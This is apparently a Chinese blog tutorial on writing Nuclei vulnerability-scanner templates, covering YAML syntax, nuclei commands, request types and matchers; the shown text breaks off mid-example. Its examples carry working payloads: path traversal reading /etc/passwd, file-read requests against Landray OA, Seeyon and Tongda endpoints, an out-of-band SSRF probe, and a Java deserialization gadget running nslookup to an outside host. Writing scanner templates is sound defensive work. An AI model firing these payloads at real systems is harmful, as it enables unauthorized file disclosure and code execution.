---
title: nuclei模板编写总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18326684
source: 博客园 - 渗透测试中心
date: 2024-07-28
fetch_date: 2025-10-06T17:41:24.685598
---

# nuclei模板编写总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [nuclei模板编写总结](https://www.cnblogs.com/backlion/p/18326684 "发布于 2024-07-27 10:19")

### 一、脚本的语法格式

* 大小写敏感
* 缩进：使用缩进表示层级关系,YAML 使用空格进行缩进，通常每个**缩进级别为两个空格**。
* 键值对：YAML 通过键值对来存储数据，键和值之间用冒号 : 分隔。
* 列表：使用短横线 `-`来表示列表中的项。
* 注释：以 `#` 开头的行是注释。
* 字符串：字符串可以不使用引号，也可以使用单引号或双引号
* id不能有中文、特殊字符、--以及空格等内容，id这个参数，您可以理解为是输出的标题，一个简单易懂的ID，可以让您更快的判断出
* info：信息块，名称 、 作者 、 严重性 、 描述 、参考和 标签 ，这些都属于信息块的范围，一般情况下，我们只需要写入**名称、作者、严重性、描述、标签**这几项即可
* name：模板名称，这个建议跟id相同即可
* severity：严重性，这里不可以使用中文，一般用**critical、hight、Medium、info**来表示威胁等级
* description：漏洞介绍，这里可以使用中文，也不限制特殊字符，一般是用来做漏洞介绍用的，可以方便使用者了解该漏洞的具体说明
* tags：标签，是为了给漏洞加一个标签，方便进行统一扫描，例如：tags: seeyon(切记不要用中文哈)
* 日常编写nuclei的yaml脚本，nuclei内置cookie-reuse属性，在发起多个请求时,需要保持会话,可以添加cookie-reuse: true来保持多个请求时会话得到保持,这在有身份验证时很有用。
* 如果匹配失败的话可以使用-debug来获取请求包和返回包进行调试，使用Burp抓包直接将请求包内容粘贴即可

### 二、Nuclei常用命令

```
 1.验证模板格式
 nuclei -t test.yaml --validate
 2.指定模板和目标
 nuclei -t test.yaml -u http://exam.com
 3.批量扫描
 nuclei -t test.yaml -l target.txt
 4.指定socks5代理扫描
 nuclei -t test.yaml -u http://exam.com -p socks5://127.0.0.1:7890

```

### 三、脚本示例

```
id: file-include   #模板的唯一标识符
 info:   #包含模板的基本信息，如名称、作者、版本等
   name: file include                          #脚本的名字
   author: bakclion                   #模板作者
   severity: high                         #安全级别  可选的有 info, low, medium, high, critical, unknown
   description: 用于测试靶场的nuclei模板    #描述模板内容
   reference: http://www.baidu.com        #参考来源
   tags: test                             #分类的标签
 requests:  #定义了如何与目标进行交互的请求部分
   - method: GET  #HTTP 方法，如 GET 或 POST
     path:  #请求的路径
       - "{{BaseURL}}/vul/dir/dir_list.php?title=../../../../../../../etc/passwd"
     headers: #请求头
         User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
     matchers:
       - type: status #匹配回包状态
         status:
           - 200
       - type: regex #匹配返回内容
         part: body
         regex:
           - "root:x:0:0:root:/root:/bin/bash"
```

### 四、脚本组成

#### 1.开头

```

```

```
id: landray-oa-fileread

 info:
   name: landray-oa-fileread
   author: backlion
   severity: high
   description: |
     蓝凌OA custom.jsp 任意文件读取漏洞,这个OA遇到的比较少
     FOFA: app="Landray-OA系统"
   reference: https://github.com/backslion
   tags: fileread,landray
```

#### 2.请求

##### Get

```
requests:
   - method: GET
     path:
       - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
```

##### POST

```
 requests:
   - method: POST
     path:
       - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: 'var={"body":{"file":"file:///etc/passwd"}}'
```

##### RAW

```
 requests:
   - raw:
       - |
         POST /ispirit/interface/gateway.php HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded

         json={"url":"/general/../../mysql5/my.ini"}
```

##### 跳转

```
  - method: GET
     path:
       - "{{BaseURL}}"
     redirects: true
     max-redirects: 2

     或者

 requests:
   - raw:
       - |
         GET /zentao/api-getModel-editor-save-filePath=bote HTTP/1.1
         redirects: true
          max-redirects: 3
```

##### **路径**

请求的下一部分是请求的路径。动态变量可以放置在路径中以在运行时修改其行为。变量以开头{{和}}结尾并且区分大小写。

```
 {{Hostname}}：这是一个常用的保留字，表示主机名。
 {{randstr}}：这是一个随机字符串。
 {{rand_int(1,9999)}}：这是一个生成 1 到 9999 之间随机整数的保留字。
 {{BaseURL}}：表示完整的基本 URL，例如 https://example.com:443/foo/bar.php。
 {{RootURL}}：表示不包含路径和文件的基本 URL，例如 https://example.com:443。
 {{Host}}：表示主机名，例如 example.com。
 {{Port}}：表示端口号，例如 443。
 {{Path}}：表示路径，例如 /seeyon/login。
 {{File}}：表示文件名，例如 bar.php。
 {{Scheme}}：表示协议，例如 https。
 {{hex_decode("")}}：这是一个十六进制解码的保留字。
 md5()：这是一个 MD5 转换的保留字
 Variable  Value
 {{BaseURL}}  https://example.com:443/foo/bar.php
 {{RootURL}}  https://example.com:443
 {{Hostname}}  example.com:443
 {{Host}}  example.com
 {{Port}}  443
 {{Path}}  /foo
 {{File}}  bar.php
 {{Scheme}}  https
```

##### stop-at-first-match

大意就是一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描,当然这个不会影响其他模板.

```

```

```
requests:
   - method: GET
     path:
       - "{{BaseURL}}"
       - "{{BaseURL}}/login"
       - "{{BaseURL}}/main"
       - "{{BaseURL}}/index"

     stop-at-first-match: true
```

##### OOB

自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描。就像 `{{interactsh-url}}` 在请求中的任何位置编写并为添加匹配器一样简单 interact\_protocol。Nuclei 将处理交互作用与模板的相关性，以及通过允许轻松进行 OOB 扫描而生成的请求的相关性。

```
 requests:
   - raw:
       - |
         GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
         Host: {{Hostname}}
```

##### JAVA反序列化

```

```

```
raw:
   -  |
     POST /index.faces;jsessionid=x HTTP/1.1
     Host: {{Hostname}}
     Accept-Encoding: gzip, deflate
     Content-Length: 1882
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Connection: close
     Content-Type: application/x-www-form-urlencoded

     javax.faces.ViewState={{generate_java_gadget("commons_collection3.1", "nslookup {{interact.sh}}", "base64")}}
```

#### 3.匹配器

```
matchers-condition: and #对多个匹配器的匹配结果进行逻辑运算：and|or，AND是同时满足条件
 matchers:
   - type: dsl #匹配器类型  <status|word|size|binary|regex|dsl>
     dsl: #使用 DSL 语法进行数据匹配(!注：更加灵活，复杂匹配，推荐使用)  <StringSlice>
       - "status_code_1 == 200 && status_code_2 == 302"
       - 'all_headers_1 == "admin" && all_headers_2 == "index"'
     condition: and #需要同时满足上面两个条件

   - type: word
     words: #返回包匹配文本(!!!注：word类型此处较为特殊，需要使用words做匹配项录入)  <StringSlice>
       - "admin.php"
       - "61646d696e2e706870"
       - "{{match_str}}"
     encoding: hex #编码器，对返回提取数据进行编码后对word内容进行匹配(!!!注：仅支持word匹配器，暂仅只支持hex)  <hex>
     #以下设置，基本通用(!!!注：除dsl类型)
     part: header #读取返回数据的区域  <header|body|无设置代表全匹配|interactsh_protocol|interactsh_request(!注：dnslog服务器返回数据,需要在发包中配合{{interactsh-url}}使用>
     condition: or #匹配结果逻辑运算  <and|or>
     negative: true #对匹配结果进行取反操作，结合condition可实现更为灵活的组合方式  <true|false>

   - type: status
     status: #与匹配器类型一致，当前为返回包状态码  <intSlice>，200或302
       - 200

   - type: regex
     regex: #使用正则进行数据匹配  <StringSlice>
       - '.*\admin.php....